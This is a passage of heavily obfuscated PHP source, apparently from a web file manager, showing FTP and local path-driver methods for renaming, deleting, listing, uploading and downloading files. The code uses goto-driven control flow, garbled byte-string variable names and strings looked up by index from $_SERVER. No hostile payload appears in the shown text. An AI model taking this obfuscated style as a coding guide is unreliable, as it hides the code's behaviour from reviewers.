$this->upload($d–ŒâÅáòç, $cÅ„Ó‚å¬); goto aË©¾ÍÀ”; Añ¢ëğñ°¶: } public function moveFile($C’¢ˆª¿‚é, $cÇø˜£™†) { if (!$this->_isconn()) { return !1; } $C’¢ˆª¿‚é = $this->iconvSystem($C’¢ˆª¿‚é); $cÇø˜£™† = $this->iconvSystem($cÇø˜£™†); $D†µÃ¨˜©Š = @ftp_rename($this->connect, $C’¢ˆª¿‚é, $cÇø˜£™†); return $D†µÃ¨˜©Š ? $this->getPathOuter($cÇø˜£™†) : !1; } public function delFile($AÀ®˜â¡°Ã) { if (!$this->_isconn()) { return !1; } $AÀ®˜â¡°Ã = $this->iconvSystem($AÀ®˜â¡°Ã); return @ftp_delete($this->connect, $AÀ®˜â¡°Ã); } public function delFolder($a•Ûô°ôË) { if (!$this->_isconn()) { return !1; } $a•Ûô°ôË = $this->iconvSystem($a•Ûô°ôË); $FñÖ†ƒ Şç = $this->ftpList($a•Ûô°ôË); if (!$FñÖ†ƒ Şç) { return @ftp_rmdir($this->connect, $a•Ûô°ôË); } foreach ($FñÖ†ƒ Şç as $CáÓ©‚Õ¯×) { if ($this->isFolder($CáÓ©‚Õ¯×)) { $CáÓ©‚Õ¯× = $this->iconvApp($CáÓ©‚Õ¯×); $this->delFolder($CáÓ©‚Õ¯×); } else { @ftp_delete($this->connect, $CáÓ©‚Õ¯×); } } return @ftp_rmdir($this->connect, $a•Ûô°ôË); } public function rename($aÛØ¥Š–ë, $bô‚ŠÃøÀ¥) { goto eÁ©ƒ¹…»½; eÁ©ƒ¹…»½: $E©Òåô°™Å =& $_SERVER[¼]; if (!$this->_isconn()) { return !1; } $c¹‰ïŸ–»Ü = $this->fileNameAuto($this->pathFather($aÛØ¥Š–ë), $bô‚ŠÃøÀ¥); goto fõã‹¡£Ô; fõã‹¡£Ô: $c¹‰ïŸ–»Ü = $this->iconvSystem($c¹‰ïŸ–»Ü); $aÛØ¥Š–ë = $this->iconvSystem($aÛØ¥Š–ë); $bÍ˜‰Ò×ì = $this->pathFather($aÛØ¥Š–ë); goto eÀŞÔ‹Ù¼ê; eÀŞÔ‹Ù¼ê: $cÂ ¦ÃÛ“ğ = rtrim($bÍ˜‰Ò×ì, $E©Òåô°™Å[8]) . $E©Òåô°™Å[8] . $c¹‰ïŸ–»Ü; $BëÙÚÕ¡Î¼ = @ftp_rename($this->connect, $aÛØ¥Š–ë, $cÂ ¦ÃÛ“ğ); $cÂ ¦ÃÛ“ğ = $this->iconvApp($cÂ ¦ÃÛ“ğ); goto c‚ç¥¬êÁ; c‚ç¥¬êÁ: return $BëÙÚÕ¡Î¼ ? $this->getPathOuter($cÂ ¦ÃÛ“ğ) : !1; goto dì´äˆ”Ğ§; dì´äˆ”Ğ§: } private function folderInfo($c•‚ß¦»ƒá, $FÔô¶Çîó¼ = false) { goto AÔ¡ÃÇ–ï’; aš‡«î§ Ü: $a¥éæÍ·èÕ = $this->iconvSystem($c•‚ß¦»ƒá); if ($FÔô¶Çîó¼) { return array($Bˆ¡ŒÏ‡à[28] => $D•Ø™’††õ, $Bˆ¡ŒÏ‡à[75] => $eè«‹Â­İƒ, $Bˆ¡ŒÏ‡à[29] => $Bˆ¡ŒÏ‡à[76]); } $Cíøõ¬ºŒ÷ = array($Bˆ¡ŒÏ‡à[28] => $D•Ø™’††õ, $Bˆ¡ŒÏ‡à[75] => $eè«‹Â­İƒ, $Bˆ¡ŒÏ‡à[29] => $Bˆ¡ŒÏ‡à[76], $Bˆ¡ŒÏ‡à[184] => 0, $Bˆ¡ŒÏ‡à[107] => 0, $Bˆ¡ŒÏ‡à[1147] => !0, $Bˆ¡ŒÏ‡à[1148] => !0); goto bÌ©ê§Ù ; AÔ¡ÃÇ–ï’: $Bˆ¡ŒÏ‡à =& $_SERVER[¼]; $eè«‹Â­İƒ = $this->getPathOuter(rtrim($c•‚ß¦»ƒá, $Bˆ¡ŒÏ‡à[8])); $D•Ø™’††õ = $this->pathThis($eè«‹Â­İƒ); goto aš‡«î§ Ü; bÌ©ê§Ù : return $Cíøõ¬ºŒ÷; goto Fµñ»´øå¢; Fµñ»´øå¢: } private function fileInfo($D…µ¦»¬§â, $a·‡¬˜ĞŠÆ = false) { goto d½Œâ¼É—¨; fº¿ğáğ: $cŸãñ«”ƒ[$c°£Ì»•Ã¼[107]] = $cŸãñ«”ƒ[$c°£Ì»•Ã¼[107]] > 0 ? $cŸãñ«”ƒ[$c°£Ì»•Ã¼[107]] : 0; return $cŸãñ«”ƒ; goto BÇ×¸°åªì; d½Œâ¼É—¨: $c°£Ì»•Ã¼ =& $_SERVER[¼]; $AïŒà™³À‚ = $this->getPathOuter(rtrim($D…µ¦»¬§â, $c°£Ì»•Ã¼[8])); $d­Ï‹¶¡Ñó = $this->pathThis($AïŒà™³À‚); goto B‹×£ßªø‘; B‹×£ßªø‘: $b¸²˜à‘…» = $this->iconvSystem($D…µ¦»¬§â); if ($a·‡¬˜ĞŠÆ) { return array($c°£Ì»•Ã¼[28] => $d­Ï‹¶¡Ñó, $c°£Ì»•Ã¼[75] => $AïŒà™³À‚, $c°£Ì»•Ã¼[29] => $c°£Ì»•Ã¼[164], $c°£Ì»•Ã¼[157] => $this->ext($D…µ¦»¬§â), $c°£Ì»•Ã¼[77] => $this->size($D…µ¦»¬§â)); } $cŸãñ«”ƒ = array($c°£Ì»•Ã¼[28] => $d­Ï‹¶¡Ñó, $c°£Ì»•Ã¼[75] => $AïŒà™³À‚, $c°£Ì»•Ã¼[29] => $c°£Ì»•Ã¼[164], $c°£Ì»•Ã¼[184] => 0, $c°£Ì»•Ã¼[107] => @ftp_mdtm($this->connect, $b¸²˜à‘…»), $c°£Ì»•Ã¼[157] => $this->ext($D…µ¦»¬§â), $c°£Ì»•Ã¼[77] => $this->size($D…µ¦»¬§â), $c°£Ì»•Ã¼[1147] => !0, $c°£Ì»•Ã¼[1148] => !0); goto fº¿ğáğ; BÇ×¸°åªì: } public function size($B¡›íëÌ™Ç) { $C„Áâê¹´© = $this->objectMeta($B¡›íëÌ™Ç); return $C„Áâê¹´© ? $C„Áâê¹´©[$_SERVER[¼][77]] : 0; } public function info($b¿›¢Œ¶‡Ô) { if ($this->isFile($b¿›¢Œ¶‡Ô)) { return $this->fileInfo($b¿›¢Œ¶‡Ô, 0); } else { if ($this->isFolder($b¿›¢Œ¶‡Ô)) { return $this->folderInfo($b¿›¢Œ¶‡Ô); } } return !1; } public function exist($Cé¯Àæ¤×ê) { return $this->objectMeta($Cé¯Àæ¤×ê) ? !0 : !1; } public function isFile($e¬Æ·øÀ) { $e¤¯¤©ƒêŠ =& $_SERVER[¼]; $EÖ«‘ù´‘ = $this->objectMeta($e¬Æ·øÀ); return $EÖ«‘ù´‘ ? $EÖ«‘ù´‘[$e¤¯¤©ƒêŠ[29]] == $e¤¯¤©ƒêŠ[164] : !1; } public function isFolder($b±Ò·±Ÿãƒ) { $b­£†ÑßÁ¼ =& $_SERVER[¼]; $C¸ÌÁ„Š¡ô = $this->objectMeta($b±Ò·±Ÿãƒ); return $C¸ÌÁ„Š¡ô ? $C¸ÌÁ„Š¡ô[$b­£†ÑßÁ¼[29]] == $b­£†ÑßÁ¼[76] : !1; } public function listPath($cÚºÒ˜ßñŠ, $e¡Ïƒ’¤šù = false) { goto CİõÇÊùÛ«; bß„Ãø¡ˆ: foreach ($B§¿Ùèİê˜ as $cÚºÒ˜ßñŠ) { if ($this->isFolder($cÚºÒ˜ßñŠ)) { $aö²İµ•ã˜[$dè¤ ›Ö‡è[74]][] = $this->folderInfo($cÚºÒ˜ßñŠ, $e¡Ïƒ’¤šù); } else { $aö²İµ•ã˜[$dè¤ ›Ö‡è[73]][] = $this->fileInfo($cÚºÒ˜ßñŠ, $e¡Ïƒ’¤šù); } } return $aö²İµ•ã˜; goto EÕ‚å‹àõâ; CİõÇÊùÛ«: $dè¤ ›Ö‡è =& $_SERVER[¼]; if (!$this->_isconn()) { return !1; } $cÚºÒ˜ßñŠ = $this->iconvSystem($cÚºÒ˜ßñŠ); goto e âõñÍ‰®; e âõñÍ‰®: $B§¿Ùèİê˜ = $this->ftpList($cÚºÒ˜ßñŠ); $aö²İµ•ã˜ = array($dè¤ ›Ö‡è[74] => array(), $dè¤ ›Ö‡è[73] => array()); if (!$B§¿Ùèİê˜) { return $aö²İµ•ã˜; } goto bß„Ãø¡ˆ; EÕ‚å‹àõâ: } public function has($fÃÙ„‡‰ø„, $a¼ˆ·ÜÃ“ = false, $C‘®ô­ = true) { goto e–›ÛÍÚĞ; EÅÎê×†çƒ: $BåîÅƒí³è = $this->ftpList($fÃÙ„‡‰ø„); if (!$BåîÅƒí³è) { return !1; } if ($a¼ˆ·ÜÃ“) { return array($dÎàôÕÃ¨[188] => 0, $dÎàôÕÃ¨[189] => count($BåîÅƒí³è)); } goto b‡¦¯ƒõğ; e–›ÛÍÚĞ: $dÎàôÕÃ¨ =& $_SERVER[¼]; if (!$this->_isconn()) { return !1; } $fÃÙ„‡‰ø„ = $this->iconvSystem($fÃÙ„‡‰ø„); goto EÅÎê×†çƒ; b‡¦¯ƒõğ: foreach ($BåîÅƒí³è as $fÃÙ„‡‰ø„) { if ($C‘®ô­) { if (!$this->isFolder($fÃÙ„‡‰ø„)) { return !0; } } else { if ($this->isFolder($fÃÙ„‡‰ø„)) { return !0; } } } return !1; goto a»®Ç˜áéÛ; a»®Ç˜áéÛ: } public function listAll($CÁİ–Ğ¤Ş¥) { goto cå˜ÁÏË®; d™±£†¤ÈÏ: $c°Ğ·ŞÓµí = array($b»Í‡Âí¿³[73] => array(), $b»Í‡Âí¿³[74] => array()); $this->recursionFtpFiles($CÁİ–Ğ¤Ş¥, $c°Ğ·ŞÓµí); $fĞ©Äøäß§ = array(); goto F˜˜ç§»Ÿ; F˜˜ç§»Ÿ: foreach ($c°Ğ·ŞÓµí[$b»Í‡Âí¿³[74]] as $bòèÃ–Èí) { $fĞ©Äøäß§[] = array($b»Í‡Âí¿³[75] => $b»Í‡Âí¿³[8] . trim(str_replace($CÁİ–Ğ¤Ş¥, $b»Í‡Âí¿³[33], $bòèÃ–Èí), $b»Í‡Âí¿³[8]) . $b»Í‡Âí¿³[8], $b»Í‡Âí¿³[76] => 1, $b»Í‡Âí¿³[77] => 0); } foreach ($c°Ğ·ŞÓµí[$b»Í‡Âí¿³[73]] as $fóÒíÒ“×Ö) { $fĞ©Äøäß§[] = array($b»Í‡Âí¿³[75] => $b»Í‡Âí¿³[8] . trim(str_replace($CÁİ–Ğ¤Ş¥, $b»Í‡Âí¿³[33], $fóÒíÒ“×Ö), $b»Í‡Âí¿³[8]), $b»Í‡Âí¿³[76] => 0, $b»Í‡Âí¿³[77] => $this->size($fóÒíÒ“×Ö)); } return $fĞ©Äøäß§; goto c†õ‘‘‰ãœ; cå˜ÁÏË®: $b»Í‡Âí¿³ =& $_SERVER[¼]; if (!$this->_isconn()) { return !1; } $CÁİ–Ğ¤Ş¥ = $this->iconvSystem($CÁİ–Ğ¤Ş¥); goto d™±£†¤ÈÏ; c†õ‘‘‰ãœ: } public function getContent($dÚ‡‰Óô…) { if (!$this->_isconn()) { return !1; } $dÚ‡‰Óô… = $this->iconvSystem($dÚ‡‰Óô…); return $this->fileSubstr($dÚ‡‰Óô…); } public function setContent($A“İÓ¦óÊ, $cì ºÜ¦Ó = '') { goto Bõ¯„ é½§; bİ£Å˜¢óŠ: return $D©ƒ¸ê›ß×; goto E‡¾â§½¡Ø; e—ô—ÚÉ½ç: file_put_contents($e— à°ñ•, $cì ºÜ¦Ó); $D©ƒ¸ê›ß× = $this->upload($A“İÓ¦óÊ, $this->iconvApp($e— à°ñ•)); $this->tempFileRemve($e— à°ñ•); goto bİ£Å˜¢óŠ; Bõ¯„ é½§: if (!$this->_isconn()) { return !1; } $aîŠÂ…·£ = $this->pathThis($this->iconvSystem($A“İÓ¦óÊ)); $e— à°ñ• = $this->tempFile($aîŠÂ…·£); goto e—ô—ÚÉ½ç; E‡¾â§½¡Ø: } public function fileSubstr($Aœ÷áßèñ‰, $DÍ¡•¡åÕ = 0, $EšÏö‚©Æ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($Aœ÷áßèñ‰, $DÍ¡•¡åÕ, $EšÏö‚©Æ); } private function ftpRequest($BˆéŸµ¿è, $b…—ƒĞí¡¼ = 0, $FÙ–‘‹ïÃã = false) { goto eƒµÚã¶¾; F¢»è„ÜÓÆ: curl_setopt($fÙÀòâç²¨, CURLOPT_RETURNTRANSFER, 1); $a‹±ÙíÇã = curl_exec($fÙÀòâç²¨); curl_close($fÙÀòâç²¨); goto e†Ëß¶ª³ß; b‰—‘ÜÏ³œ: curl_setopt($fÙÀòâç²¨, CURLOPT_URL, $BŞ›Ü‡·„Ğ . $this->pathEncode($BˆéŸµ¿è)); curl_setopt($fÙÀòâç²¨, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($FÙ–‘‹ïÃã) { $b¹‰™óŠÙ­ = $b…—ƒĞí¡¼ + $FÙ–‘‹ïÃã - 1; curl_setopt($fÙÀòâç²¨, CURLOPT_RANGE, "{$b…—ƒĞí¡¼}\55{$b¹‰™óŠÙ­}"); } goto F¢»è„ÜÓÆ; eƒµÚã¶¾: $BˆéŸµ¿è = $this->iconvSystem($BˆéŸµ¿è); $BŞ›Ü‡·„Ğ = $this->scheme . $this->host . $_SERVER[¼][4] . $this->port; $fÙÀòâç²¨ = curl_init(); goto b‰—‘ÜÏ³œ; e†Ëß¶ª³ß: return $a‹±ÙíÇã; goto fô¯›Ö·“¤; fô¯›Ö·“¤: } public function upload($eŸß®ï…Å§, $c¨Á¤Ğé±˜, $dÏÃŒ³¶äƒ = false, $D‘ğÖ‹èé‰ = REPEAT_REPLACE) { goto bÌƒ¬¹ØÄŠ; bÌƒ¬¹ØÄŠ: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($eŸß®ï…Å§))) { return !1; } $eŸß®ï…Å§ = $this->iconvSystem($eŸß®ï…Å§); goto A¨¢„ìŒêù; A¨¢„ìŒêù: $c¨Á¤Ğé±˜ = $this->iconvSystem($c¨Á¤Ğé±˜); $f›ÖÜ¹“¶ğ = ftp_nb_put($this->connect, $eŸß®ï…Å§, $c¨Á¤Ğé±˜, FTP_BINARY); while ($f›ÖÜ¹“¶ğ == FTP_MOREDATA) { $f›ÖÜ¹“¶ğ = ftp_nb_continue($this->connect); } goto D¨ì»ª®”÷; D¨ì»ª®”÷: if ($f›ÖÜ¹“¶ğ != FTP_FINISHED) { return !1; } return $this->getPathOuter($eŸß®ï…Å§); goto f‹â‰¿Ì£Á; f‹â‰¿Ì£Á: } public function download($FÏ‚äŒÛèÅ, $FèÕ‹Ñ£Œƒ = '') { goto F¢îôåŠ; Aá…ŞØ¬…: while ($f‹ôù»ê“ == FTP_MOREDATA) { $f‹ôù»ê“ = ftp_nb_continue($this->connect); } if ($f‹ôù»ê“ != FTP_FINISHED) { return !1; } return $this->iconvApp($FèÕ‹Ñ£Œƒ); goto eÄ‹Â‘; fÖğ¤‘ĞŸã: $FÏ‚äŒÛèÅ = $this->iconvSystem($FÏ‚äŒÛèÅ); $FèÕ‹Ñ£Œƒ = $this->iconvSystem($FèÕ‹Ñ£Œƒ); $f‹ôù»ê“ = ftp_nb_get($this->connect, $FèÕ‹Ñ£Œƒ, $FÏ‚äŒÛèÅ, FTP_BINARY); goto Aá…ŞØ¬…; F¢îôåŠ: if (!$this->_isconn()) { return !1; } $D‹´©ªôÎÓ = $this->pathFather($FèÕ‹Ñ£Œƒ); if (!IO::mkdir($D‹´©ªôÎÓ)) { return !1; } goto fÖğ¤‘ĞŸã; eÄ‹Â‘: } private function ftpList($F…ËåÀ‰õ…) { goto f¢É˜ìƒ; A§˜Ø¿©¥‹: $CÁ»›œç… = array(); foreach ($d»…½¢Ï‹ as $Eí³ƒÙîàœ) { if ($Eí³ƒÙîàœ == $DÂØÃ¯ÉğÉ[93] || $Eí³ƒÙîàœ == $DÂØÃ¯ÉğÉ[1150]) { continue; } if (!strstr($Eí³ƒÙîàœ, $DÂØÃ¯ÉğÉ[8])) { $Eí³ƒÙîàœ = $F…ËåÀ‰õ… . ltrim($Eí³ƒÙîàœ, $DÂØÃ¯ÉğÉ[8]); } $CÁ»›œç…[] = $this->iconvApp($Eí³ƒÙîàœ); } return $CÁ»›œç…; goto b¯™éÍâì; f¢É˜ìƒ: $DÂØÃ¯ÉğÉ =& $_SERVER[¼]; if (!$this->isFolder($F…ËåÀ‰õ…)) { return !1; } @ftp_chdir($this->connect, $DÂØÃ¯ÉğÉ[8]); goto bÉËöã ¡; bÉËöã ¡: $F…ËåÀ‰õ… = rtrim($F…ËåÀ‰õ…, $DÂØÃ¯ÉğÉ[8]) . $DÂØÃ¯ÉğÉ[8]; $d»…½¢Ï‹ = @ftp_nlist($this->connect, $F…ËåÀ‰õ…); if ($d»…½¢Ï‹ === !1) { $d»…½¢Ï‹ = @ftp_rawlist($this->connect, $F…ËåÀ‰õ…); foreach ($d»…½¢Ï‹ as $f¦Œ½‚­¶º => $C£Öß×ªŠö) { $d»…½¢Ï‹[$f¦Œ½‚­¶º] = end(explode($DÂØÃ¯ÉğÉ[1149], $C£Öß×ªŠö)); } } goto A§˜Ø¿©¥‹; b¯™éÍâì: } private function recursionFtpFiles($fí®Š¦¾¥Œ, &$EÍ«Î³ÑİÇ) { $c„çÛ­¯å =& $_SERVER[¼]; if (!$this->_isconn()) { return !1; } if (!($c®Úò”æ»© = $this->ftpList($fí®Š¦¾¥Œ))) { return !1; } foreach ($c®Úò”æ»© as $fí®Š¦¾¥Œ) { if ($this->isFolder($fí®Š¦¾¥Œ)) { $this->recursionFtpFiles($fí®Š¦¾¥Œ, $EÍ«Î³ÑİÇ); $EÍ«Î³ÑİÇ[$c„çÛ­¯å[74]][] = $fí®Š¦¾¥Œ; } else { $EÍ«Î³ÑİÇ[$c„çÛ­¯å[73]][] = $fí®Š¦¾¥Œ; } } } private function objectMeta($Aœ¬è‚¾Ê–) { goto A¶ôãŒé¬à; A¶ôãŒé¬à: $E–«ËƒÓšõ =& $_SERVER[¼]; $FœˆàÙÚÄ = $E–«ËƒÓšõ[1151] . md5($Aœ¬è‚¾Ê–); $AŠø——ƒ¹¹ = Cache::get($FœˆàÙÚÄ); goto dÃæ†šŸ¦‡; dÃæ†šŸ¦‡: if ($AŠø——ƒ¹¹ !== null && $AŠø——ƒ¹¹ !== !1) { return $AŠø——ƒ¹¹; } if (!$this->_isconn()) { return !1; } @ftp_chdir($this->connect, $E–«ËƒÓšõ[8]); goto cš­ÉĞø‚¶; cš­ÉĞø‚¶: $aëº‹•ö£Ã = @ftp_size($this->connect, $this->iconvSystem($Aœ¬è‚¾Ê–)); if ($aëº‹•ö£Ã != -1) { $AŠø——ƒ¹¹ = array($E–«ËƒÓšõ[77] => $aëº‹•ö£Ã, $E–«ËƒÓšõ[29] => $E–«ËƒÓšõ[164]); } else { $E¢¸È–…ã† = @ftp_chdir($this->connect, $this->iconvSystem($Aœ¬è‚¾Ê–)); $AŠø——ƒ¹¹ = $E¢¸È–…ã† ? array($E–«ËƒÓšõ[77] => 0, $E–«ËƒÓšõ[29] => $E–«ËƒÓšõ[76]) : !1; } Cache::set($FœˆàÙÚÄ, $AŠø——ƒ¹¹, 0); goto a½©ãªĞñ; a½©ãªĞñ: return $AŠø——ƒ¹¹; goto FÌÍã®”; FÌÍã®”: } } class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($BŠ´Ê…¶ØÅ) { if (substr($BŠ´Ê…¶ØÅ, 0, 2) == $_SERVER[¼][1140]) { $BŠ´Ê…¶ØÅ = BASIC_PATH . substr($BŠ´Ê…¶ØÅ, 2); } return $BŠ´Ê…¶ØÅ; } public function iconvApp($dÁ´®‘±™µ) { $FÄÉ½’„êÁ =& $_SERVER[¼]; global $config; return $this->iconvTo($dÁ´®‘±™µ, $config[$FÄÉ½’„êÁ[1138]], $config[$FÄÉ½’„êÁ[1137]]); } public function iconvSystem($Eİ¦‰Ñ¦) { $aší‚É¦ŸÓ =& $_SERVER[¼]; global $config; return $this->iconvTo($Eİ¦‰Ñ¦, $config[$aší‚É¦ŸÓ[1137]], $config[$aší‚É¦ŸÓ[1138]]); } public function getPathOuter($a˜¨‹Æ®Ø) { goto a±²ÂÜ¤ä¡; D‚¦Ÿùˆ²ã: if (substr($E·¢¡ÚÆ, 0, 2) == $aêÎÜ¦ªÓÎ[1140]) { $E·¢¡ÚÆ = BASIC_PATH . substr($E·¢¡ÚÆ, 2); } if (substr($a˜¨‹Æ®Ø, 0, 2) == $aêÎÜ¦ªÓÎ[1140]) { $a˜¨‹Æ®Ø = BASIC_PATH . substr($a˜¨‹Æ®Ø, 2); } $E·¢¡ÚÆ = KodIO::clear($E·¢¡ÚÆ); goto c’³Ôì‰ˆ¾; fèœ¨†¯›: return $this->pathDriver . $aêÎÜ¦ªÓÎ[8] . ltrim($a˜¨‹Æ®Ø, $aêÎÜ¦ªÓÎ[8]); goto F‚††½°ºì; c’³Ôì‰ˆ¾: $a˜¨‹Æ®Ø = KodIO::clear($a˜¨‹Æ®Ø); $a˜¨‹Æ®Ø = substr($a˜¨‹Æ®Ø, strlen($E·¢¡ÚÆ)); if (empty($this->pathDriver)) { return $a˜¨‹Æ®Ø; } goto fèœ¨†¯›; a±²ÂÜ¤ä¡: $aêÎÜ¦ªÓÎ =& $_SERVER[¼]; $E·¢¡ÚÆ = $this->iconvApp($this->pathBase); $a˜¨‹Æ®Ø = $this->iconvApp($a˜¨‹Æ®Ø); goto D‚¦Ÿùˆ²ã; F‚††½°ºì: } public function mkfile($DÊÕƒĞªØÅ, $aç¯ÜßÖ¼› = '', $EˆøÓÍÀ = REPEAT_RENAME) { $DÊÕƒĞªØÅ = $this->iconvSystem($DÊÕƒĞªØÅ); @touch($DÊÕƒĞªØÅ); if ($aç¯ÜßÖ¼›) { file_put_contents($DÊÕƒĞªØÅ, $aç¯ÜßÖ¼›); } return is_file($DÊÕƒĞªØÅ) ? $this->getPathOuter($DÊÕƒĞªØÅ) : !1; } public function mkdir($fÛõÌñœ©œ, $b´¼°Ç‹· = REPEAT_SKIP) { $fÛõÌñœ©œ = $this->iconvSystem($fÛõÌñœ©œ); if (is_dir($fÛõÌñœ©œ)) { return $this->getPathOuter($fÛõÌñœ©œ); } @mkdir($fÛõÌñœ©œ, 511, !0); return is_dir($fÛõÌñœ©œ) ? $this->getPathOuter($fÛõÌñœ©œ) : !1; } public function copyFile($aÙíÄöÚ¾, $EÂ íğ£»Ü) { $this->mkdir($this->pathFather($EÂ íğ£»Ü)); $aÙíÄöÚ¾ = $this->iconvSystem($aÙíÄöÚ¾); $EÂ íğ£»Ü = $this->iconvSystem($EÂ íğ£»Ü); $A¤Ä‹ô¼à¿ = @copy($aÙíÄöÚ¾, $EÂ íğ£»Ü); return $A¤Ä‹ô¼à¿ ? $this->getPathOuter($EÂ íğ£»Ü) : !1; } public function moveFile($aÏ‡¸¥ù¡, $a¼Ü³«à›Ü) { $this->mkdir($this->pathFather($a¼Ü³«à›Ü)); $aÏ‡¸¥ù¡ = $this->iconvSystem($aÏ‡¸¥ù¡); $a¼Ü³«à›Ü = $this->iconvSystem($a¼Ü³«à›Ü); $A‰îƒÏÔø× = intval(@rename($aÏ‡¸¥ù¡, $a¼Ü³«à›Ü)); if (!$A‰îƒÏÔø×) { if ($A‰îƒÏÔø× = intval(@copy($aÏ‡¸¥ù¡, $a¼Ü³«à›Ü))) { @unlink($aÏ‡¸¥ù¡); } } return $A‰îƒÏÔø× ? $this->getPathOuter($a¼Ü³«à›Ü) : !1; } public function delFile($a½ÕÂ‹¡ˆ›) { $a½ÕÂ‹¡ˆ› = $this->iconvSystem($a½ÕÂ‹¡ˆ›); if (!@unlink($a½ÕÂ‹¡ˆ›)) { @chmod($a½ÕÂ‹¡ˆ›, 511); if (!@unlink($a½ÕÂ‹¡ˆ›)) { return !1; } } else { return !0; } } public function delFolder($c½ŸåÔÁ) { goto fçùŠçåš; fçùŠçåš: $Cğ®ÀœõÜ =& $_SERVER[¼]; $c½ŸåÔÁ = $this->iconvSystem($c½ŸåÔÁ); if (!is_dir($c½ŸåÔÁ)) { return !0; } goto bÙ“±Ş°Í; bÙ“±Ş°Í: if (!($CÑ§Ş·©…Ö = opendir($c½ŸåÔÁ))) { return !1; } while (($bÓ½İœ‘è = readdir($CÑ§Ş·©…Ö)) !== !1) { if ($bÓ½İœ‘è == $Cğ®ÀœõÜ[93] || $bÓ½İœ‘è == $Cğ®ÀœõÜ[1150]) { continue; } $d÷™©ƒ‚º = $c½ŸåÔÁ . $Cğ®ÀœõÜ[8] . $bÓ½İœ‘è; if (!is_dir($d÷™©ƒ‚º)) { if (!unlink($d÷™©ƒ‚º)) { chmod($d÷™©ƒ‚º, 511); if (!unlink($d÷™©ƒ‚º)) { return !1; } } } else { chmod($d÷™©ƒ‚º, 511); $d÷™©ƒ‚º = $this->iconvApp($d÷™©ƒ‚º); if (!$this->delFolder($d÷™©ƒ‚º)) { return !1; } } } closedir($CÑ§Ş·©…Ö); goto FÌ¸æ¿ÔÛ¬; FÌ¸æ¿ÔÛ¬: return rmdir($c½ŸåÔÁ); goto bÑ³°˜Ãš; bÑ³°˜Ãš: } public function rename($Bî¯‰¡¥Èß, $DÚ°Ëâ¦ ³) { goto C„®™Ï´¬Ç; AÚ  ¦»Ä‚: $Bî¯‰¡¥Èß = $this->iconvSystem($Bî¯‰¡¥Èß); $BÊô¼§Ü‰ = $this->pathFather($Bî¯‰¡¥Èß); $f¿É‰ï·º§ = rtrim($BÊô¼§Ü‰, $F†Æô¤ôÄ§[8]) . $F†Æô¤ôÄ§[8] . $CŞÛ ‘ÉÆ¾; goto eƒƒêÎ‹Îè; eƒƒêÎ‹Îè: $DÅ„ø•ù¦í = @rename($Bî¯‰¡¥Èß, $f¿É‰ï·º§); $f¿É‰ï·º§ = $this->iconvApp($f¿É‰ï·º§); return $DÅ„ø•ù¦í ? $this->getPathOuter($f¿É‰ï·º§) : !1; goto cÙÃ¼“¦–•; C„®™Ï´¬Ç: $F†Æô¤ôÄ§ =& $_SERVER[¼]; $CŞÛ ‘ÉÆ¾ = $this->fileNameAuto($this->pathFather($Bî¯‰¡¥Èß), $DÚ°Ëâ¦ ³); $CŞÛ ‘ÉÆ¾ = $this->iconvSystem($CŞÛ ‘ÉÆ¾); goto AÚ  ¦»Ä‚; cÙÃ¼“¦–•: } public function size($A‰ÕÁ”œµò) { $A‰ÕÁ”œµò = $this->iconvSystem($A‰ÕÁ”œµò); return (double) abs(sprintf($_SERVER[¼][1152], @filesize($A‰ÕÁ”œµò))); } public function info($döÕä†‡¾ä) { $döÕä†‡¾ä = $this->iconvSystem($döÕä†‡¾ä); if ($this->isFolder($döÕä†‡¾ä)) { return $this->folderInfo($döÕä†‡¾ä); } else { if ($this->isFile($döÕä†‡¾ä)) { return $this->fileInfo($döÕä†‡¾ä); } } return !1; } protected function infoChildren($dØ¹ñõÇÇô, &$EÆëÒ¬Ññé, $AÑ¦¤äÔÜÈ = true) { $bÆ–º»—½’ =& $_SERVER[¼]; $dØ¹ñõÇÇô = rtrim($dØ¹ñõÇÇô, $bÆ–º»—½’[8]) . $bÆ–º»—½’[8]; if ($AÑ¦¤äÔÜÈ) { check_abort(); $dØ¹ñõÇÇô = $this->iconvSystem($dØ¹ñõÇÇô); } if (!($C®êÅÌóØˆ = @opendir($dØ¹ñõÇÇô))) { return; } while (($cµ ğ§¤Ç– = readdir($C®êÅÌóØˆ)) !== !1) { if ($cµ ğ§¤Ç– == $bÆ–º»—½’[93] || $cµ ğ§¤Ç– == $bÆ–º»—½’[1150]) { continue; } $B—Í“”‘ÒÚ = $dØ¹ñõÇÇô . $cµ ğ§¤Ç–; if (is_file($B—Í“”‘ÒÚ)) { $EÆëÒ¬Ññé[$bÆ–º»—½’[78]]++; $EÆëÒ¬Ññé[$bÆ–º»—½’[77]] += (double) abs(sprintf($bÆ–º»—½’[1152], @filesize($B—Í“”‘ÒÚ))); } else { $EÆëÒ¬Ññé[$bÆ–º»—½’[79]]++; $this->infoChildren($B—Í“”‘ÒÚ, $EÆëÒ¬Ññé, !1); } } closedir($C®êÅÌóØˆ); } private function folderInfo($aéø¿¶¸øô, $Bç†•¾ëƒ´ = false) { $fÎâ©²Û‚ =& $_SERVER[¼]; $aéø¿¶¸øô = rtrim($aéø¿¶¸øô, $fÎâ©²Û‚[8]) . $fÎâ©²Û‚[8]; $Fâá‹éÆ‡Ü = $this->iconvApp($this->pathThis($aéø¿¶¸øô)); if ($Bç†•¾ëƒ´) { return array($fÎâ©²Û‚[28] => $Fâá‹éÆ‡Ü, $fÎâ©²Û‚[75] => $this->getPathOuter($aéø¿¶¸øô), $fÎâ©²Û‚[29] => $fÎâ©²Û‚[76]); } $C»ØºëŒâÕ = array($fÎâ©²Û‚[28] => $Fâá‹éÆ‡Ü, $fÎâ©²Û‚[75] => $this->getPathOuter($aéø¿¶¸øô), $fÎâ©²Û‚[29] => $fÎâ©²Û‚[76], $fÎâ©²Û‚[184] => @filectime($aéø¿¶¸øô), $fÎâ©²Û‚[107] => @filemtime($aéø¿¶¸øô), $fÎâ©²Û‚[1153] => @fileatime($aéø¿¶¸øô), $fÎâ©²Û‚[1147] => is_readable($aéø¿¶¸øô), $fÎâ©²Û‚[1148] => is_writable($aéø¿¶¸øô), $fÎâ©²Û‚[1154] => get_mode($aéø¿¶¸øô)); return $C»ØºëŒâÕ; } private function fileInfo($D¢°Ì÷Ø Ó, $fŠä¬Î‘ÁÒ = false) { $fÁ°¨ÙÕšÔ =& $_SERVER[¼]; 